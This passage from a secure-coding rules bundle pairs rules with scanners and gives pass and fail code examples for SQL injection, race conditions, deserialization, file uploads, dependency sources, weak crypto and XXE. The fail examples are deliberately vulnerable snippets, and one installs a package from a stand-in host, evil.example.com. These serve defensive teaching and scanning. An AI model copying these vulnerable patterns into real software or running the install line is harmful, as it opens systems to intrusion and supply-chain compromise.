  **Example (pass):**

  ```javascript
  await pool.query('SELECT balance FROM accounts WHERE user_name = $1', [customerName]);
  ```

  **Example (pass):**

  ```java
  PreparedStatement ps = conn.prepareStatement(
      "SELECT balance FROM accounts WHERE user_name = ?");
  ps.setString(1, customerName);
  ```

- **DO** allow-list dynamic identifiers (table, column, sort direction) when they cannot be bound.

  **Example (pass):** Map `sort=price` to a fixed enum `ORDER BY price ASC` — never interpolate raw user strings into identifier positions.

#### DO NOT

- **DO NOT** concatenate or interpolate user input into SQL text.

  **Example (fail):**

  ```python
  query = f"SELECT * FROM users WHERE name = '{username}'"
  cur.execute(query)
  ```

- **DO NOT** use ORM `raw()` / string SQL with embedded variables.

  **Example (fail):**

  ```javascript
  db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
  ```

- **DO NOT** build JDBC SQL with string concatenation or `String.format`.

  **Example (fail):**

  ```java
  stmt.executeQuery("SELECT * FROM users WHERE name = '" + username + "'");
  ```

**Source:** `context/05-injection-flaws/context/sql-injection-prevention-cheat-sheet.md`, `context/05-injection-flaws/exercises-challenges/sql-injection.md`

### Rule: No TOCTOU outside lock

When shared mutable state (balances, inventory, quotas) is read then written, the read and write must occur inside the same critical section. Checking a condition before acquiring a lock creates a time-of-check to time-of-use (TOCTOU) race (CWE-367).

#### DO

- **DO** perform check and update inside the same lock, transaction, or atomic DB operation.

  **Example (pass):**

  ```java
  synchronized (sourceCard) {
      if (sourceCard.getBalance() < amount) throw new InsufficientFundsException();
      sourceCard.debit(amount);
      destCard.credit(amount);
  }
  ```

  **Example (pass):**

  ```sql
  UPDATE accounts SET balance = balance - :amt
  WHERE id = :id AND balance >= :amt;
  -- check rows affected == 1
  ```

#### DO NOT

- **DO NOT** validate shared state outside a lock then modify inside it.

  **Example (fail):**

  ```java
  if (sourceCard.getBalance() < amount) return false;
  lock.lock();
  sourceCard.debit(amount);
  lock.unlock();
  ```

- **DO NOT** use read-modify-write on shared balances without transactions or row-level locking.

  **Example (fail):**

  ```python
  if account.balance < amount:
      return False
  with lock:
      account.balance -= amount
  ```

**Source:** `context/green_belt_assessment/e0523/challenge-10.md`, `context/10_Mishandling_of_Exceptional_Conditions/context/error-details.md` (concurrency section)

### Rule: No unsafe deserialization

Untrusted serialized object graphs can execute attacker-controlled code or corrupt application state. Prefer JSON/DTO mapping with schema validation; never feed untrusted bytes to language-native deserializers.

#### DO

- **DO** parse JSON (or similar text formats) into plain objects and map fields explicitly to domain types.

  **Example (pass):**

  ```javascript
  const dto = orderSchema.parse(JSON.parse(body));
  const order = Order.fromDto(dto);
  ```

- **DO** verify signatures or HMACs on serialized payloads before parsing when integrity matters.

  **Example (pass):** Reject payload when `verify_hmac(payload, signature, secret)` fails.

#### DO NOT

- **DO NOT** call native deserializers on request bodies or message queue payloads.

  **Example (fail):**

  ```python
  obj = pickle.loads(request.data)
  ```

- **DO NOT** use `yaml.load` without `SafeLoader` on external input.

  **Example (fail):** `yaml.load(untrusted_yaml_string)`

**Source:** `context/08_Software_or_Data_Integrity_Failures/context/deserialization-of-untrusted-data.md`

### Rule: No unsafe file upload handling

File uploads are a common path to remote code execution, path traversal, and denial of service. Production code must validate size, content type (magic bytes), and storage location — never trust client filenames, extensions, or `Content-Type` headers alone.

#### DO

- **DO** generate internal storage names (UUID) and map to metadata in the database.

  **Example (pass):**

  ```python
  detected = magic.from_buffer(data, mime=True)
  if detected not in ALLOWED_MIME:
      raise InvalidUploadError("file type not allowed")
  safe_name = f"{uuid4().hex}.{ALLOWED_EXT[detected]}"
  storage.put(user_id, safe_name, data)
  ```

  **Example (pass):**

  ```java
  String safeName = UUID.randomUUID() + "." + validatedExtension;
  Path target = uploadRoot.resolve(safeName); // flat directory, no user segments
  Files.copy(inputStream, target, StandardCopyOption.REPLACE_EXISTING);
  ```

- **DO** enforce per-file and per-account size limits before reading the full stream.

  **Example (pass):** Reject when `Content-Length` or streamed byte count exceeds `MAX_UPLOAD_BYTES`.

- **DO** scan uploads in an isolated worker; serve from a separate domain or signed URLs when possible.

  **Example (pass):** Enqueue virus scan job; block download until scan status is `clean`.

#### DO NOT

- **DO NOT** persist uploads using the client-provided original filename or extension alone.

  **Example (fail):**

  ```javascript
  cb(null, file.originalname);
  ```

- **DO NOT** allow uploads into web-root or executable directories.

  **Example (fail):**

  ```python
  save_path = os.path.join("/var/www/html/uploads", request.files["doc"].filename)
  ```

- **DO NOT** trust `Content-Type` or file extension without server-side magic-byte detection.

  **Example (fail):**

  ```javascript
  if (file.mimetype === 'image/png') { store(file); }
  ```

**Source:** `context/06-Insecure-Design/context/unrestricted-file-upload.md`, `context/06-Insecure-Design/exercises-challenges/File-Upload-Vulnerability-Unrestricted-File-Upload.md`

### Rule: No untrusted component sources

Dependencies must come from trusted registries with integrity verification — not arbitrary URLs, git branches, or unverified JAR downloads. Supply-chain compromise starts when build scripts pull unaudited artifacts (CWE-829, OWASP A06).

#### DO

- **DO** pin dependencies in lockfiles (`package-lock.json`, `poetry.lock`, Maven `dependencyManagement`) from official registries.

  **Example (pass):**

  ```json
  "dependencies": { "lodash": "4.17.21" }
  ```

  Resolved via `npm ci` against committed lockfile.

- **DO** verify checksums/signatures in CI; scan with SBOM tools (Dependabot, Snyk, OWASP Dependency-Check).

  **Example (pass):** CI fails when `mvn verify` detects dependency hash mismatch.

#### DO NOT

- **DO NOT** install packages directly from HTTP URLs or unverified git endpoints in production build scripts.

  **Example (fail):**

  ```bash
  pip install https://evil.example.com/package.tar.gz
  ```

  **Example (fail):**

  ```json
  "dependency": "git+http://unknown.host/lib.git#master"
  ```

- **DO NOT** load executable code from remote URLs at runtime without signature verification.

  **Example (fail):**

  ```javascript
  eval(await fetch(req.query.scriptUrl).then(r => r.text()));
  ```

**Source:** `context/green_belt_assessment/e0523/challenge-7.md`, `context/08_Software_or_Data_Integrity_Failures/exercises-challenges/Using-Components-From-Untrusted-Source.md`

### Rule: No weak crypto algorithms

Cryptographic choices must match the threat: password hashing uses adaptive algorithms; transport uses TLS 1.2+; symmetric encryption uses modern AEAD; tokens use CSPRNG. Legacy digests and ciphers fail when used for security-sensitive operations (CWE-327, OWASP A02).

#### DO

- **DO** use Argon2id, scrypt, bcrypt, or PBKDF2 for password hashing — not general-purpose digests.

  **Example (pass):**

  ```javascript
  const hash = await bcrypt.hash(password, 12);
  ```

- **DO** use AES-GCM or ChaCha20-Poly1305 for authenticated encryption at rest when encryption is required.

  **Example (pass):**

  ```javascript
  crypto.createCipheriv('aes-256-gcm', key, iv);
  ```

  **Example (pass):**

  ```java
  Cipher.getInstance("AES/GCM/NoPadding");
  ```

- **DO** use `secrets`, `crypto.randomBytes`, or `SecureRandom` for session tokens, reset links, and CSRF secrets.

  **Example (pass):**

  ```python
  import secrets
  token = secrets.token_urlsafe(32)
  ```

#### DO NOT

- **DO NOT** use MD5 or SHA1 for password storage or integrity protection of security artifacts.

  **Example (fail):**

  ```python
  stored = hashlib.md5(password.encode()).hexdigest()
  ```

  **Example (fail):**

  ```java
  MessageDigest.getInstance("MD5");
  ```

- **DO NOT** use `Math.random()`, `random.randint()`, or `java.util.Random` for session tokens or security nonces.

  **Example (fail):**

  ```javascript
  const token = Math.floor(Math.random() * 1e6);
  ```

- **DO NOT** accept JWT with `alg: none` or use SHA1withRSA in new signature code.

  **Example (fail):**

  ```javascript
  jwt.sign(payload, secret, { algorithm: 'none' });
  ```

**Source:** `context/04-cryotiographic-failures/context/guildline-weak-algoithm-use.md`

### Rule: No XXE in unsafe XML parser configuration

XML parsers that resolve external entities or DTDs can leak files, perform SSRF, or cause denial of service. Disable DTDs and external entities on every parser that processes untrusted XML (CWE-611, OWASP A05).

#### DO

- **DO** disable DTDs and external entity resolution on SAX/DOM/StAX parsers.

  **Example (pass):**

  ```java
  factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
  ```

  **Example (pass):**

  ```python
  parser = defusedxml.ElementTree.parse(untrusted_stream)
  ```

- **DO** use defusedxml or equivalent hardening for Python; set `XMLConstants.FEATURE_SECURE_PROCESSING` where supported.

#### DO NOT

- **DO NOT** parse untrusted XML with default parser settings.

  **Example (fail):**

  ```java
  Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(inputStream);
  ```

- **DO NOT** enable external DTD or XInclude on parsers handling request bodies.

  **Example (fail):**

  ```python
  etree.parse(untrusted_xml)  # lxml/xml.etree without defusedxml
  ```

**Source:** `context/green_belt_assessment/e0523/challenge-7.md`, `context/08_Software_or_Data_Integrity_Failures/exercises-challenges/Using-Components-From-Untrusted-Source.md`
<!-- execute_rules:bundle_rules:end -->

---

## Rules index

Two-letter **prefix** = SCW context category (`context/category-index.md`). Each rule file sets `category:` in frontmatter. Machine-readable: `inputs/rules-index.json`.

### Category prefixes

| Prefix | Category | Context folder |
| --- | --- | --- |
| **cf** | Cryptographic failures | `04-cryotiographic-failures/` |
| **if** | Injection flaws | `05-injection-flaws/` |
| **id** | Insecure design | `06-Insecure-Design/` |
| **af** | Authentication failures | `07_Authentication_Failures/` |
| **df** | Software / data integrity failures | `08_Software_or_Data_Integrity_Failures/` |
| **lf** | Logging & alerting failures | `09_Logging_Alerting_Failures/` |
| **ec** | Mishandling of exceptional conditions | `10_Mishandling_of_Exceptional_Conditions/` |
| **gb** | Green belt assessment | `green_belt_assessment/` |

### Rules by prefix

| Prefix | Rule | Scanner stem |
| --- | --- | --- |
| **cf** | no-plaintext-password-storage | `no_plaintext_password_storage_scanner.py` |
| **cf** | no-plaintext-sensitive-data-at-rest | `no_plaintext_sensitive_data_at_rest_scanner.py` |
| **cf** | no-weak-crypto-algorithms | `no_weak_crypto_algorithms_scanner.py` |
| **cf** | no-hardcoded-secrets | `no_hardcoded_secrets_scanner.py` |
| **if** | no-sql-string-concatenation | `no_sql_string_concatenation_scanner.py` |
| **if** | no-os-command-injection | `no_os_command_injection_scanner.py` |
| **if** | no-eval-dynamic-code-execution | `no_eval_dynamic_code_execution_scanner.py` |
| **if** | no-dangerous-xss-sinks | `no_dangerous_xss_sinks_scanner.py` |
| **if** | no-ldap-filter-injection | `no_ldap_filter_injection_scanner.py` |
| **af** | no-predictable-session-token | `no_predictable_session_token_scanner.py` |
| **af** | no-insufficient-login-rate-limiting | `no_insufficient_login_rate_limiting_scanner.py` |
| **af** | no-client-side-auth-trust | `no_client_side_auth_trust_scanner.py` |
| **af** | no-jwt-none-algorithm | `no_jwt_none_algorithm_scanner.py` |
| **df** | no-unsafe-deserialization | `no_unsafe_deserialization_scanner.py` |
| **df** | no-mass-assignment-from-request | `no_mass_assignment_from_request_scanner.py` |
| **df** | no-untrusted-component-sources | `no_untrusted_component_sources_scanner.py` |
| **df** | no-xxe-unsafe-xml-parser | `no_xxe_unsafe_xml_parser_scanner.py` |
| **id** | no-unsafe-file-upload-handling | `no_unsafe_file_upload_handling_scanner.py` |
| **id** | no-path-traversal-in-paths | `no_path_traversal_in_paths_scanner.py` |
| **id** | no-excessive-response-data | `no_excessive_response_data_scanner.py` |
| **ec** | no-sensitive-error-disclosure | `no_sensitive_error_disclosure_scanner.py` |
| **ec** | no-toctou-outside-lock | `no_toctou_outside_lock_scanner.py` |
| **lf** | no-secrets-in-log-output | `no_secrets_in_log_output_scanner.py` |
| **lf** | no-missing-security-event-logging | `no_missing_security_event_logging_scanner.py` |
